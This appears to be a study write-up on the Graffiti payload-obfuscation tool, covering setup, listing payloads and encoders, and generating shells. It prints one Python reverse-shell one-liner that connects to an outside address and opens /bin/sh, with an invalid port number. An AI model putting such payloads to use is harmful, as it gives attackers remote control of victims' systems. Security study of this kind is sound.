# Study of one of the hacking SUBJECT 
<p align="center">
  <img src="https://user-images.githubusercontent.com/14183473/49157062-8a351500-f2e4-11e8-80cd-00acd809171e.png">
</p>

# What GRAFFITI is?
Graffiti is a tool that uses a number of different encoding techniques to create obfuscated payloads.

### It offers an array of one-liners and shells in languages such as:

 - Python
 - Perl
 - PHP
 - Powershell
 - Bash

Graffiti will also accept a language that is not currently on the list and store the oneliner into a database.

### Payloads can be encoded using the following techniques:

 - Base64
 - Hex
 - AES256
 - ...



### Features

 - Option to run native OS commands
 - Multiple encoding techniques 
 - Terminal history
 - Ability to run external commands
 - Ability to securely wipe the history files
 - Ability to create your own payload files
 
# What is the mechanism how to do it?
First, we need to clone into the Github for [Graffiti](https://github.com/Ekultek/Graffiti) by using `git` command

![e1800918](pic/1.PNG)

Then get into that directory and list everything to compare what is missing or not by using `ls` command

![e1800918](pic/2.PNG)

Graffiti comes with a builtin terminal, when you pass no flags to the program it will drop into the terminal. The terminal has history, the ability to run external commands, and it's own internal commands. In order to get help, type `graffiti -h`:

![e1800918](pic/3.PNG)

# Now, let's the running begins

The easy way to run Graffiti is in normal command-line mode. All we have to do is pass the arguments after the command, just like you would with any other tool or script. For example, we can list all available payloads with the `-l` command

![e1800918](pic/4.PNG)

We can see that there are options segregated between Windows and Linux for [Netcat shells](https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-netcat-swiss-army-knife-hacking-tools-0148657/), [Python shells](https://wiki.python.org/moin/PythonShells) and several others.

Graffiti comes complete with a database that will insert each encoded payload into it, in order to allow end users to view already created payloads for future use. To see the available encoders for the payloads, type `-Vc`

![e1800918](pic/5.PNG)

The `-p` command is the staff of life of Graffiti — use it to specify a payload, followed by `-c` to specify the encoding technique, and finally `-lH` and `-lP` to set the listening address and port, respectively. Here's a raw-format Python reverse shell which means no encoding:

```bash

root@e1800918:~/cyebr/Graffiti# graffiti -p /linux/python/socket_reverse.json -c raw -lH 18.0.9.18 -lP 1800918
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("18.0.9.18",1800918));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```
